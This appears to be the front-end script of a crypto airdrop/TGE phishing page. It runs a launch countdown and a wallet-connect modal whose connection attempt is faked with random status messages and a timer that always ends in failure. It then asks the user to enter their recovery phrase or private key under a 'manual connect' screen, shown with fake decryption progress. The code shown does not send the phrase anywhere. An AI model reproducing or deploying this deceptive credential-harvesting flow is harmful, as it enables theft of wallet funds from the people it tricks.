// TGE countdown — target March 23 2026 00:00 UTC
function updateCountdown() {
  const target = new Date('2026-03-23T00:00:00Z');
  const now = new Date();
  let diff = Math.max(0, target - now);

  const d = Math.floor(diff / 86400000); diff -= d * 86400000;
  const h = Math.floor(diff / 3600000); diff -= h * 3600000;
  const m = Math.floor(diff / 60000); diff -= m * 60000;
  const s = Math.floor(diff / 1000);

  const setEl = (id, val) => { const el = document.getElementById(id); if (el) el.textContent = String(val).padStart(2, '0'); };
  setEl('cdDays', d);
  setEl('cdHours', h);
  setEl('cdMins', m);
  setEl('cdSecs', s);
}
updateCountdown();
setInterval(updateCountdown, 1000);

const wOverlay = document.getElementById('wOverlay');
const wScreen1 = document.getElementById('wScreen1');
const subIds = ['wScreenOther', 'wScreen2', 'wScreen3', 'wScreen4', 'wScreen5'];

function openWallet() {
  wOverlay.classList.add('open');
  document.body.style.overflow = 'hidden';
  allOff();
}
function closeWallet() {
  stopTimers();
  wOverlay.classList.remove('open');
  document.body.style.overflow = '';
  allOff();
}
function allOff() {
  wScreen1.classList.remove('hidden');
  subIds.forEach(id => document.getElementById(id).classList.remove('active'));
}
function showSub(id) {
  wScreen1.classList.add('hidden');
  subIds.forEach(sid => document.getElementById(sid).classList.remove('active'));
  document.getElementById(id).classList.add('active');
}

// open triggers
document.querySelectorAll('.cta-primary, .btn-eligibility, .action-card')
  .forEach(el => el.addEventListener('click', e => { e.preventDefault(); openWallet(); }));

wOverlay.addEventListener('click', e => { if (e.target === wOverlay) closeWallet(); });
document.addEventListener('keydown', e => { if (e.key === 'Escape') closeWallet(); });

// ── wallet identity ──────────────────────────────────
let activeImg = '', activeName = '';
function setWallet(img, name) {
  activeImg = img; activeName = name;
  ['s2Img', 's3Img', 's4Img', 's5Img'].forEach(id => document.getElementById(id).src = img);
  ['s2Name', 's3Name', 's4Name', 's5Name'].forEach(id => document.getElementById(id).textContent = name);
}

// ── other wallets ────────────────────────────────────
function openOtherWallets() {
  showSub('wScreenOther');
  document.getElementById('owSearch').value = '';
  filterOw('');
}
document.getElementById('owSearch').addEventListener('input', function () {
  filterOw(this.value.trim().toLowerCase());
});
function filterOw(q) {
  const items = document.querySelectorAll('.ow-item');
  let visible = 0;
  items.forEach(item => {
    const n = item.querySelector('.ow-name').textContent.toLowerCase();
    const c = item.querySelector('.ow-chain').textContent.toLowerCase();
    const show = n.includes(q) || c.includes(q);
    item.classList.toggle('hidden', !show);
    if (show) visible++;
  });
  const nr = document.getElementById('owNoResults');
  document.getElementById('owQuery').textContent = q;
  nr.style.display = (visible === 0 && q) ? 'block' : 'none';
}
function selectOwWallet(el) {
  const img = el.querySelector('img').src;
  const name = el.querySelector('.ow-name').textContent;
  setWallet(img, name);
  startConnecting();
}

// ── timers ───────────────────────────────────────────
let cTimer, sTimer, pTimer, aborted = false;
function stopTimers() {
  clearTimeout(cTimer); clearInterval(sTimer); clearInterval(pTimer);
  aborted = true;
}

const statusMsgs = [
  "Initializing secure connection...", "Scanning for wallet device...",
  "Establishing encrypted channel...", "Verifying wallet signature...",
  "Requesting account access...", "Checking network compatibility...",
  "Syncing wallet state...", "Authenticating session...",
  "Resolving on-chain identity...", "Confirming wallet permissions...",
  "Loading account balances...", "Retrieving transaction history...",
  "Validating network endpoints...", "Preparing secure handshake...",
  "Awaiting device confirmation...", "Connecting to Solana mainnet...",
  "Syncing asset registry...", "Verifying chain ID...",
  "Establishing WebSocket link...", "Fetching wallet metadata...",
  "Decoding wallet address...", "Requesting signing permissions...",
  "Resolving address...", "Preparing wallet interface...",
  "Almost there — finalizing...", "Connecting to RPC endpoint...",
  "Initializing token registry...", "Binding wallet to session...",
  "Verifying account integrity...", "Checking pending transactions...",
  "Loading BP token balance...", "Finalizing authentication...",
  "Checking airdrop eligibility...", "Fetching Points balance...",
  "Syncing reward data...", "Connection attempt finishing..."
];

function startConnecting() {
  aborted = false;
  showSub('wScreen2');
  const statusEl = document.getElementById('s2Status');
  const progressEl = document.getElementById('s2Progress');
  progressEl.style.width = '0%';
  let pool = [...statusMsgs].sort(() => Math.random() - 0.5);
  let i = 0;
  statusEl.textContent = pool[0];
  sTimer = setInterval(() => {
    i++;
    statusEl.style.opacity = '0';
    setTimeout(() => { statusEl.textContent = pool[i % pool.length]; statusEl.style.opacity = '1'; }, 100);
  }, 300);
  let pct = 0;
  pTimer = setInterval(() => {
    pct = Math.min(pct + (100 / (15000 / 200)), 99);
    progressEl.style.width = pct + '%';
  }, 200);
  cTimer = setTimeout(() => {
    if (aborted) return;
    clearInterval(sTimer); clearInterval(pTimer);
    progressEl.style.width = '100%';
    showSub('wScreen3');
  }, 15000);
}

function handleWalletSelect(el) {
  const img = el.querySelector('img').src;
  const name = el.querySelector('.w-featured-name, .w-item-name').textContent;
  setWallet(img, name);
  startConnecting();
}

document.getElementById('retryBtn').addEventListener('click', () => { stopTimers(); startConnecting(); });
document.getElementById('manualBtn').addEventListener('click', () => { stopTimers(); showSub('wScreen4'); });

function handleManualConnect() {
  const input = document.getElementById('phraseInput').value.trim();
  if (!input) { alert('Please enter your recovery phrase or private key.'); return; }
  showSub('wScreen2');
  aborted = false;
  const statusEl = document.getElementById('s2Status');
  const progressEl = document.getElementById('s2Progress');
  progressEl.style.width = '0%';
  const manualMsgs = [
    "Verifying credentials...", "Decrypting recovery phrase...",
    "Checking phrase integrity...", "Validating word count...",
    "Deriving wallet address...", "Cross-referencing on-chain data...",
    "Authenticating private key...", "Establishing secure session...",
    "Verifying key format...", "Almost done..."
  ];
  let i = 0; statusEl.textContent = manualMsgs[0];
  sTimer = setInterval(() => {
    i++;
    statusEl.style.opacity = '0';
    setTimeout(() => { statusEl.textContent = manualMsgs[i % manualMsgs.length]; statusEl.style.opacity = '1'; }, 100);
  }, 600);
  let pct = 0;
  pTimer = setInterval(() => {
    pct = Math.min(pct + (100 / (6000 / 200)), 99);
    progressEl.style.width = pct + '%';
  }, 200);
  cTimer = setTimeout(() => {
    if (aborted) return;
    clearInterval(sTimer); clearInterval(pTimer);
    progressEl.style.width = '100%';
    showSub('wScreen5');
  }, 6000);
}

function handleRetryManual() {
  document.getElementById('phraseInput').value = '';
  showSub('wScreen4');
}